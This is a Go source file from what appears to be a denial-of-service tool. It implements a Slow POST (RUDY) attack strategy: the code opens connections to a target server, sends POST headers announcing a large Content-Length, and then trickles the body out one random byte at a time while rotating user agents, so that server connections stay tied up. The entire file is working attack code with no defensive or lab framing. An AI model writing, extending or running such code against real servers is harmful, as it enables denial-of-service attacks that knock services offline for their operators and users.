package strategy

import (
	"context"
	"crypto/tls"
	"fmt"
	"math/rand"
	"net"
	"sync/atomic"
	"time"
)

// SlowPost implements the Slow POST (RUDY) attack.
// It sends POST request with large Content-Length but transmits body very slowly,
// one byte at a time, to occupy server connections.
type SlowPost struct {
	sendInterval      time.Duration
	connectionTimeout time.Duration
	maxSessionLife    time.Duration
	contentLength     int
	userAgents        []string
	activeConnections int64
	localAddr         *net.TCPAddr
}

func NewSlowPost(sendInterval time.Duration, contentLength int, bindIP string) *SlowPost {
	return &SlowPost{
		sendInterval:      sendInterval,
		connectionTimeout: 10 * time.Second,
		maxSessionLife:    5 * time.Minute,
		contentLength:     contentLength,
		userAgents:        defaultUserAgents,
		localAddr:         newLocalTCPAddr(bindIP),
	}
}

func (s *SlowPost) Execute(ctx context.Context, target Target) error {
	parsedURL, host, useTLS, err := parseTargetURL(target.URL)
	if err != nil {
		return err
	}

	sessionCtx, cancel := context.WithTimeout(ctx, s.maxSessionLife)
	defer cancel()

	var conn net.Conn
	dialer := &net.Dialer{
		Timeout:   s.connectionTimeout,
		LocalAddr: s.localAddr,
	}

	if useTLS {
		tlsConfig := &tls.Config{
			ServerName:         parsedURL.Hostname(),
			InsecureSkipVerify: false,
		}
		conn, err = tls.DialWithDialer(dialer, "tcp", host, tlsConfig)
	} else {
		conn, err = dialer.DialContext(sessionCtx, "tcp", host)
	}

	if err != nil {
		return fmt.Errorf("connection failed: %w", err)
	}
	defer conn.Close()
	atomic.AddInt64(&s.activeConnections, 1)
	defer atomic.AddInt64(&s.activeConnections, -1)

	userAgent := s.userAgents[rand.Intn(len(s.userAgents))]
	path := parsedURL.Path
	if path == "" {
		path = "/"
	}

	// Send complete POST headers with large Content-Length
	// Server will wait for the body that we'll send very slowly
	postRequest := fmt.Sprintf(
		"POST %s?r=%d HTTP/1.1\r\n"+
			"Host: %s\r\n"+
			"User-Agent: %s\r\n"+
			"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"+
			"Accept-Language: en-US,en;q=0.5\r\n"+
			"Accept-Encoding: gzip, deflate\r\n"+
			"Content-Type: application/x-www-form-urlencoded\r\n"+
			"Content-Length: %d\r\n"+
			"Connection: keep-alive\r\n"+
			"\r\n",
		path,
		rand.Intn(100000),
		parsedURL.Host,
		userAgent,
		s.contentLength,
	)

	conn.SetWriteDeadline(time.Now().Add(5 * time.Second))
	if _, err := conn.Write([]byte(postRequest)); err != nil {
		return fmt.Errorf("failed to write POST header: %w", err)
	}

	ticker := time.NewTicker(s.sendInterval)
	defer ticker.Stop()

	bytesSent := 0
	bodyChars := "abcdefghijklmnopqrstuvwxyz0123456789"

	for {
		select {
		case <-sessionCtx.Done():
			return nil
		case <-ticker.C:
			if bytesSent >= s.contentLength {
				// Reset and start new request
				bytesSent = 0

				conn.SetWriteDeadline(time.Now().Add(5 * time.Second))
				if _, err := conn.Write([]byte(postRequest)); err != nil {
					return fmt.Errorf("failed to write new POST header: %w", err)
				}
				continue
			}

			// Send single byte of body
			bodyByte := bodyChars[rand.Intn(len(bodyChars))]

			conn.SetWriteDeadline(time.Now().Add(5 * time.Second))
			if _, err := conn.Write([]byte{byte(bodyByte)}); err != nil {
				return fmt.Errorf("body byte send failed: %w", err)
			}
			bytesSent++
		}
	}
}

func (s *SlowPost) Name() string {
	return "slow-post"
}

func (s *SlowPost) ActiveConnections() int64 {
	return atomic.LoadInt64(&s.activeConnections)
}
